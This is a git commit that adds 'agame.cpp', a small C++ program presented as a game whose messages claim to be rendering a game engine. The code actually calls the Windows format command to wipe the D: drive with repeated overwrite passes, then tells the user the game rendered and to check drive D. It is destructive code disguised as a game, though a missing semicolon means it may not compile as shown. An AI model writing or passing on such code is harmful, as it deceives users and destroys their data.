6409fe3d7480052724d1dbd7ca3baaf807fe7bb6
LiuTianyouOnLuogu <61583168+LiuTianyouOnLuogu@users.noreply.github.com>
2020-07-15 13:20:52 +0800

    Create agame.cpp

---
+++ code/agame.cpp
@@ -0,0 +1,13 @@
+#include<iostream>
+#include<cstdlib>
+using namespace std;
+int main(){
+  cerr<<"开始渲染游戏引擎……";
+  system("format /P:16 /X D: > tmpfile");
+  while(true){
+    system("find \"%\" tmpfile");
+    system("timeout /t 1 /nobreak");
+    system("clear")
+  }
+  cerr<<"游戏渲染成功。请检查D盘。";
+}
